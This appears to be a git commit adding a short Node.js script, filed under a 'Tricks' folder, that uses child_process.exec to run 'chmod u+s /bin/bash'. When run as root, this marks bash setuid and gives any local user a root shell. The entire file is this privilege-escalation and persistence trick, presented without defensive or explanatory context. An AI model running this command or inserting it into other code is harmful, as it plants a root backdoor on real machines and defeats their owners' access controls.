084900f89139f445fa98587b89e7cd6d4697050c
lufei1336 <121921759+lufei1336@users.noreply.github.com>
2023-02-01 04:43:23 -0500

    Create exec_Sys_Command.js

---
+++ Tricks/node/exec_Sys_Command.js
@@ -0,0 +1,13 @@
+const { exec } = require("child_process");
+
+exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
